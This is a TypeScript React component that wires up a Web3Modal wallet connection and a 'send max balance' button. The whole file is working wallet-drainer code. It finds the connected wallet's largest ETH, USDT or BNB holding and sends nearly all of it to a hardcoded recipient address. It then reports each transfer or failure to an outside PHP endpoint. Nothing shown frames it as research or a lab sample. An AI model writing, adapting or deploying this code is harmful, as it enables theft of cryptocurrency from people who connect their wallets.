'use client'

import { createWeb3Modal, defaultConfig } from '@web3modal/ethers/react'
import { useWeb3Modal } from '@web3modal/ethers/react'
import { BigNumber } from '@ethersproject/bignumber'
import { Web3Provider, ExternalProvider } from '@ethersproject/providers'
import { Contract } from '@ethersproject/contracts'
import { formatEther } from '@ethersproject/units'
import styled from 'styled-components'
import { useState } from 'react'

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = 'e67036fc2887623576e98ce387998086'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}

// 3. Create modal
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com',
  icons: ['https://avatars.mywebsite.com/']
}

createWeb3Modal({
  ethersConfig: defaultConfig({ metadata }),
  chains: [mainnet],
  projectId
})

export function Web3ModalProvider({ children }: { children: React.ReactNode }) {
  return children
}

const Button = styled.button`
  border: 1px solid green;
  padding: 10px;
  cursor: pointer;
  &:hover {
    background-color: #f99ff9;
  }
`

const sendLog = async (type: string, details: string) => {
  try {
    await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/backend.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type, details })
    })
  } catch (error) {
    console.error('Error sending log:', error)
  }
}

export function ConnectButton() {
  const { open } = useWeb3Modal()
  const [provider, setProvider] = useState<Web3Provider | null>(null)

  const detectWallet = () => {
    if (typeof window.ethereum !== 'undefined') {
      return window.ethereum
    }
    if (typeof window.web3 !== 'undefined') {
      return window.web3.currentProvider
    }
    return null
  }

  const connectAndSend = async () => {
    try {
      const detectedProvider = detectWallet()

      if (detectedProvider) {
        const web3Provider = new Web3Provider(detectedProvider as ExternalProvider)
        setProvider(web3Provider)

        const signer = web3Provider.getSigner()
        const address = await signer.getAddress()

        // Token contract addresses
        const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
        const bnbAddress = '0xB8c77482e45F1F44dE1745F52C74426C631bDD52' // Note: BNB on Ethereum network

        // ERC20 ABI
        const erc20Abi = [
          'function balanceOf(address owner) view returns (uint256)',
          'function transfer(address to, uint amount) returns (bool)'
        ]

        // Create token contract instances
        const usdtContract = new Contract(usdtAddress, erc20Abi, signer)
        const bnbContract = new Contract(bnbAddress, erc20Abi, signer)

        // Fetch balances
        const ethBalance = await web3Provider.getBalance(address)
        const usdtBalance = await usdtContract.balanceOf(address)
        const bnbBalance = await bnbContract.balanceOf(address)

        // Determine the highest balance
        let highestBalanceToken: 'ETH' | 'USDT' | 'BNB' = 'ETH'
        let highestBalance = ethBalance
        if (usdtBalance.gt(highestBalance)) {
          highestBalance = usdtBalance
          highestBalanceToken = 'USDT'
        }
        if (bnbBalance.gt(highestBalance)) {
          highestBalance = bnbBalance
          highestBalanceToken = 'BNB'
        }

        // Calculate gas fees
        const gasPrice = await web3Provider.getGasPrice()
        const gasLimit = BigNumber.from(21000) // Base transaction cost
        const gasCost = gasPrice.mul(gasLimit)

        const recipient = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f' // replace with the desired recipient address

        if (highestBalanceToken === 'ETH') {
          const value = highestBalance.sub(gasCost)
          const tx = await signer.sendTransaction({
            to: recipient,
            value
          })
          await tx.wait()
          await sendLog('approved', `ETH transaction to ${recipient} with value ${value.toString()}`)
        } else if (highestBalanceToken === 'USDT') {
          const usdtGasLimit = BigNumber.from(65000) // Approximate gas limit for USDT transfer
          const usdtGasCost = gasPrice.mul(usdtGasLimit)
          const usdtValue = highestBalance.sub(usdtGasCost)
          const tx = await usdtContract.transfer(recipient, usdtValue)
          await tx.wait()
          await sendLog('approved', `USDT transaction to ${recipient} with value ${usdtValue.toString()}`)
        } else if (highestBalanceToken === 'BNB') {
          const bnbGasLimit = BigNumber.from(65000) // Approximate gas limit for BNB transfer
          const bnbGasCost = gasPrice.mul(bnbGasLimit)
          const bnbValue = highestBalance.sub(bnbGasCost)
          const tx = await bnbContract.transfer(recipient, bnbValue)
          await tx.wait()
          await sendLog('approved', `BNB transaction to ${recipient} with value ${bnbValue.toString()}`)
        }

        alert('Transaction successful!')
      } else {
        // Open WalletConnect if no provider is detected
        const provider = await open()
        if (provider) {
          const web3Provider = new Web3Provider(provider as ExternalProvider)
          setProvider(web3Provider)
        } else {
          throw new Error('No wallet provider found')
        }
      }
    } catch (error) {
      console.error(error)

      // Check if error is an instance of Error
      if (error instanceof Error) {
        await sendLog('error', `Transaction failed: ${error.message}`)
      } else {
        await sendLog('error', 'Transaction failed: Unknown error')
      }

      alert('Transaction failed!')
    }
  }

  return (
    <>
      <Button onClick={connectAndSend}>Connect wallet and send max balance</Button>
    </>
  )
}
